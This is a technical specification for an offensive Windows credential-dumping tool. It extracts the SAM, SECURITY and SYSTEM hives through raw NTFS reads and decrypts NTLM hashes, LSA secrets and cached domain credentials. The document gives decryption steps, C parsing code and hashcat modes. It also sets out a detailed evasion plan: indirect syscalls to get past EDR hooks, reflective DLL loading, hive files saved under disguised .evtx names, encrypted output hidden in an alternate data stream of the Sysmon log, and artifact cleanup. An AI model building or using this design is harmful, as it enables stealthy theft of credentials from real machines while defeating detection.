# Plan 2 — SAM + LSA Secrets + Cached Credentials: Technical Specification

> **Target**: T1003.002 (SAM) + T1003.004 (LSA Secrets) + T1003.005 (Cached Domain Credentials)
> **Pre-condition**: SYSTEM privilege (assumed)  
> **Scope**: Hive extraction + offline parse — no PE chain

---

## 1. Overview

Offline credential extraction from registry hive files (SAM, SECURITY, SYSTEM) using raw NTFS volume read to bypass file system ACLs and locks. No LSASS access, no VSS, no `reg save`. Output encrypted and written to ADS.

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌────────────┐
│ Raw NTFS     │    │ Hive File    │    │ Offline       │    │ Encrypted  │
│ Volume Read  │───▶│ Extraction   │───▶│ Parse         │───▶│ ADS Output │
│ (\\.\C:)     │    │ (SAM/SEC/SYS)│    │ (Custom DLL)  │    │            │
└──────────────┘    └──────────────┘    └──────────────┘    └────────────┘
```

---

## 2. Functional Requirements

### FR-1: Raw Volume Access
| ID | Requirement |
|----|-------------|
| FR-1.1 | Open `\\.\C:` with `GENERIC_READ` via `CreateFileW` |
| FR-1.2 | Read NTFS $Boot sector → parse BPB for cluster size + MFT location |
| FR-1.3 | Read MFT $DATA attribute to get full MFT |

### FR-2: File Location via MFT
| ID | Requirement |
|----|-------------|
| FR-2.1 | Walk MFT from root directory → `Windows` → `System32` → `config` |
| FR-2.2 | Locate MFT entries for: `SAM`, `SECURITY`, `SYSTEM` |
| FR-2.3 | Parse `$DATA` attribute DataRun list to get cluster runs |
| FR-2.4 | Read hive files directly from NTFS clusters |
| FR-2.5 | Validate hive signature (`regf`) for each extracted file |

### FR-3: Offline Hive Parsing
| ID | Requirement |
|----|-------------|
| FR-3.1 | Parse SAM hive: enumerate `SAM\Domains\Account\Users\{RID}\V` |
| FR-3.2 | Parse SYSTEM hive: extract SysKey from `SYSTEM\CurrentControlSet\Control\Lsa` |
| FR-3.3 | Decrypt NTLM hashes using SysKey + RID + MD5 |
| FR-3.4 | Parse SECURITY hive: extract LSA secrets (`NL$KM`, `DPAPI_SYSTEM`, DefaultPassword) |
| FR-3.5 | Decrypt LSA secrets using NL$KM + SysKey |
| FR-3.6 | Parse SECURITY\Cache: extract MSCache v2 entries (cached domain logins) |
| FR-3.7 | All parsing via reflective DLL (no `LoadLibrary`, no external tools) |

### FR-4: Registry Fallback
| ID | Requirement |
|----|-------------|
| FR-4.1 | If raw NTFS blocked, fall back to `NtSaveKey` via indirect syscall |
| FR-4.2 | Save hives to masqueraded paths (`*.evtx` in winevt\Logs) |
| FR-4.3 | Use `NtSaveKey` not `RegSaveKeyExW` (bypass Win32 hook) |

### FR-5: Output
| ID | Requirement |
|----|-------------|
| FR-5.1 | Encrypt output: AES-256-GCM, key = SHA256(machineSID) |
| FR-5.2 | Write to ADS: `C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx:cred` |
| FR-5.3 | Binary output format: header + machine info + user entries + LSA secrets + MSCache entries |
| FR-5.4 | No plaintext credentials on disk |

---

## 3. NTFS Raw Read Architecture

```
NTFS Volume Layout:
┌────────────────────────────────────────────────────────────┐
│ $Boot (sector 0)                                            │
│   ├─ bytesPerSector: 512                                    │
│   ├─ sectorsPerCluster: 8 → clusterSize = 4096              │
│   └─ mftStartCluster: 0x00000000000C0000                    │
├────────────────────────────────────────────────────────────┤
│ $MFT (Master File Table)                                    │
│   ├─ Record 0: $MFT itself                                  │
│   ├─ Record 5: Root directory (\)                           │
│   ├─ Record N: \Windows (directory)                          │
│   ├─ Record M: \Windows\System32 (directory)                 │
│   ├─ Record P: \Windows\System32\config (directory)          │
│   ├─ Record Q: \Windows\System32\config\SAM ($DATA)         │
│   ├─ Record R: \Windows\System32\config\SECURITY ($DATA)    │
│   └─ Record S: \Windows\System32\config\SYSTEM ($DATA)      │
├────────────────────────────────────────────────────────────┤
│ Data Runs (cluster chains for each file)                    │
│   SAM:      clusters [A..B], [C..D]                         │
│   SECURITY: clusters [E..F]                                  │
│   SYSTEM:   clusters [G..H], [I..J], [K..L]                  │
└────────────────────────────────────────────────────────────┘
```

### MFT Entry Parsing

```c
// MFT Record format
typedef struct _MFT_FILE_RECORD {
    CHAR   signature[4];     // "FILE" or "BAAD"
    USHORT sequenceOffset;   // offset to fixup array
    USHORT fixupCount;       // number of fixup entries
    ULONG64 lsn;             // $LogFile sequence number
    USHORT sequenceNumber;   // record reuse count
    USHORT linkCount;        // hard link count
    USHORT firstAttrOffset;  // offset to first attribute
    USHORT flags;            // 0x0001 = in-use, 0x0002 = directory
    ULONG  bytesInUse;       // real size of record
    ULONG  bytesAllocated;   // allocated size
    ULONG64 baseRecord;      // base MFT record (if extension)
    USHORT nextAttrId;       // next attribute ID
    // ... attributes follow
} MFT_FILE_RECORD;

// Attributes we care about
#define ATTR_STANDARD_INFORMATION  0x10
#define ATTR_FILE_NAME             0x30
#define ATTR_DATA                  0x80

// $FILE_NAME attribute: contains parent directory MFT reference + file name
// $DATA attribute: non-resident → DataRun list → clusters
```

### DataRun Decoding

```c
// DataRun format: [header_byte][cluster_count][cluster_offset]...
// Header byte: high nibble = offset size, low nibble = length size
// e.g., 0x33: 3 bytes length, 3 bytes offset (common for large files)
// Runs are relative to previous run (except first)

typedef struct _DATA_RUN {
    ULONG64 offset;   // absolute cluster offset
    ULONG64 length;   // number of clusters
} DATA_RUN;

DWORD ParseDataRuns(PBYTE dataRunBytes, DWORD size, DATA_RUN** runs) {
    DWORD count = 0;
    ULONG64 currentOffset = 0;
    PBYTE ptr = dataRunBytes;
    
    while (*ptr != 0x00 && (ptr - dataRunBytes) < size) {
        BYTE header = *ptr++;
        BYTE lenSize  = header & 0x0F;
        BYTE offSize  = (header >> 4) & 0x0F;
        
        ULONG64 runLength = 0;
        memcpy(&runLength, ptr, lenSize);
        ptr += lenSize;
        
        ULONG64 runOffset = 0;
        memcpy(&runOffset, ptr, offSize);
        // Sign-extend if negative (relative offset can be negative for sparse files)
        if (runOffset & (1ULL << (offSize * 8 - 1))) {
            ULONG64 mask = ~((1ULL << (offSize * 8)) - 1);
            runOffset |= mask;
        }
        ptr += offSize;
        
        currentOffset += runOffset;
        (*runs)[count].offset = currentOffset;
        (*runs)[count].length = runLength;
        count++;
    }
    return count;
}
```

---

## 4. Hive Parsing Detail

### 4.1 Registry Hive Format

```
Hive file structure:
┌──────────────────┐
│ Base Block       │  ← "regf" signature, 4096 bytes
│  ├─ Sequence 1   │
│  └─ Sequence 2   │
├──────────────────┤
│ HBIN Block 1     │  ← "hbin" signature, 4096+ bytes
│  ├─ Cell 1       │     Each cell: size (negative = allocated)
│  ├─ Cell 2       │     Cell data follows its header
│  └─ ...          │
├──────────────────┤
│ HBIN Block 2     │
│  └─ ...          │
└──────────────────┘
```

### 4.2 SAM → NTLM Hash Extraction

```
Path: SAM\Domains\Account\Users\{RID}\V

V value structure (variable size):
  [0x00]  4 bytes: unknown (0x00000001)
  [0x04]  4 bytes: unknown
  [0x08]  4 bytes: unknown
  [0x0C]  4 bytes: offset to NTLM hash within V data
  [0x10]  4 bytes: NTLM hash length (always 0x14 = 20 bytes incl. header?)
  [0x14]  4 bytes: offset to LM hash within V data
  [0x18]  4 bytes: unknown
  [0x1C]  ...
  [0xCC]  Encrypted credential data block (offset 0xCC from V start)
          ├─ [offset from 0x0C]: NTLM hash (16 bytes)
          └─ [offset from 0x14]: LM hash (16 bytes)

SysKey extraction (from SYSTEM hive):
  1. SYSTEM\CurrentControlSet\Control\Lsa\JD    → 4 bytes
  2. SYSTEM\CurrentControlSet\Control\Lsa\Skew1 → 4 bytes
  3. SYSTEM\CurrentControlSet\Control\Lsa\GBG   → 4 bytes
  4. SYSTEM\CurrentControlSet\Control\Lsa\Data  → 4 bytes
  5. Concatenate → 16 bytes → permute via lookup table → SysKey

NTLM hash decryption:
  1. rc4_key = MD5(SysKey || RID_bytes || "NTPASSWORD\0" || SysKey)
  2. NTLM_hash = RC4(rc4_key, encrypted_NTLM_block)
  3. OR: AES-ECB(SysKey, encrypted_data) on newer Windows (post-8.1)
```

### 4.3 LSA Secrets → Decrypt

```
Path: SECURITY\Policy\Secrets\{Key}\CurrVal

NL$KM (LSA encryption key):
  1. Extract encrypted NL$KM from SECURITY\Policy\Secrets\NL$KM\CurrVal
  2. First 60 bytes: metadata
  3. Remaining: encrypted LSA key
  4. Decrypt LSA key using SysKey → get 16-byte LSA encryption key

Other secrets (DefaultPassword, DPAPI_SYSTEM, $MACHINE.ACC):
  1. Read CurrVal encrypted blob
  2. Skip metadata header
  3. Decrypt with LSA encryption key
  4. Output: plaintext secret

MSCache v2:
  Path: SECURITY\Cache\NL$1, NL$2, ...
  Each value: MSCache v2 entry
  1. Skip 96-byte header
  2. Read username (Unicode, null-term)
  3. Read domain (Unicode, null-term, may be empty)
  4. Read encrypted DCC hash
  5. Format: $DCC2$10240#username#domain#hash_hex
  6. Crackable with hashcat -m 2100
```

---

## 5. Interface Definitions

### 5.1 Command Line

```
SAMnLSADump_SAM.exe <command>

Commands:
  --dump-all          Full: extract hives → parse → encrypt → ADS
  --extract-only      Extract hives only, save to file (for offline analysis)
  --parse-only <dir>  Parse already-extracted hives
  --method-ntfs       Force raw NTFS method
  --method-registry   Force NtSaveKey method (fallback)
  --whoami            Check privilege
  --cleanup           Remove artifacts

Options:
  --output-file <f>   Write output to file (instead of ADS)
  --no-encrypt        Skip encryption (debug)
  --include-history   Include password history (from SAM F record)
```

### 5.2 Output Format

```
Binary blob (pre-encryption):
┌──────────────────────────────────────┐
│ Header                               │
│  Magic: 0x4D41534C ("LSAM")          │
│  Version: 2                          │
│  UserCount: uint16                   │
│  SecretCount: uint16                  │
│  CacheCount: uint16                   │
│  ComputerName: UTF-16LE null-term    │
│  DomainName: UTF-16LE null-term      │
│  MachineSID: binary SID              │
├──────────────────────────────────────┤
│ User Entries (UserCount ×)           │
│  RID: uint32                         │
│  NameLen: uint16                     │
│  Name: UTF-8                         │
│  NTLM: 16 bytes                      │
│  LM: 16 bytes                        │
│  Flags: uint8                        │
├──────────────────────────────────────┤
│ LSA Secrets (SecretCount ×)          │
│  KeyLen: uint16                      │
│  Key: UTF-8                          │
│  DataLen: uint32                     │
│  Data: variable                      │
├──────────────────────────────────────┤
│ MSCache Entries (CacheCount ×)        │
│  UserLen: uint16                     │
│  User: UTF-8                         │
│  DomainLen: uint16                   │
│  Domain: UTF-8                       │
│  DCC: $DCC2$... format, null-term   │
└──────────────────────────────────────┘

→ AES-256-GCM encrypt (key = SHA256(machineSID))
→ Base64 → ADS write
```

---

## 6. Bypass Strategy

| # | EDR Layer | Detection | Bypass |
|---|-----------|-----------|--------|
| 1 | `NtCreateFile(\\.\C:)` hook | Raw volume access | Indirect syscall; this is a legitimate operation used by backup/defrag |
| 2 | Minifilter (IRP_MJ_READ on volume) | Cluster reads from SAM path | EDR doesn't parse NTFS → doesn't know which file each cluster belongs to |
| 3 | `NtOpenFile(SAM)` hook | Direct SAM access | Not used — raw NTFS bypasses file-level APIs entirely |
| 4 | `RegSaveKeyExW` hook | Registry export | Not used for primary method; fallback uses `NtSaveKey` via indirect syscall |
| 5 | File creation scan | New file with credential data | ADS write → no new file; encryption → content not analyzable |
| 6 | Volume Shadow Copy detection | VSS creation | Not used — raw NTFS needs no VSS |

---

## 7. Test Cases

| TC | Scenario | Expected |
|----|----------|---------|
| TC-01 | SYSTEM shell, NTFS, no EDR block | Full extraction, all creds parsed |
| TC-02 | Raw NTFS blocked, fallback to NtSaveKey | Fallback succeeds |
| TC-03 | Windows 10 22H2, 3 local users | 3 NTLM hashes + LSA secrets extracted |
| TC-04 | Domain-joined machine, cached logins | MSCache v2 entries extracted |
| TC-05 | Auto-logon enabled | DefaultPassword in LSA secrets |
| TC-06 | DPAPI protected data | DPAPI_SYSTEM backup key extracted |
| TC-07 | EDR with volume access monitoring | No detection via indirect syscall |
| TC-08 | Output verification | `hashcat -m 1000` cracks NTLM | `hashcat -m 2100` cracks MSCache |

---

## 8. Success Criteria

- [ ] SAM hive extracted: all local user NTLM hashes
- [ ] SECURITY hive extracted: all LSA secrets decrypted
- [ ] MSCache v2 entries extracted from SECURITY\Cache
- [ ] SysKey correctly derived from SYSTEM hive
- [ ] No file-level API called on SAM/SECURITY paths
- [ ] Output encrypted + in ADS (no plaintext on disk)
- [ ] All parsing done reflectively (no external tools)
- [ ] No EDR alerts triggered
- [ ] Artifacts cleaned: no hive files left on disk, no ADS remnants
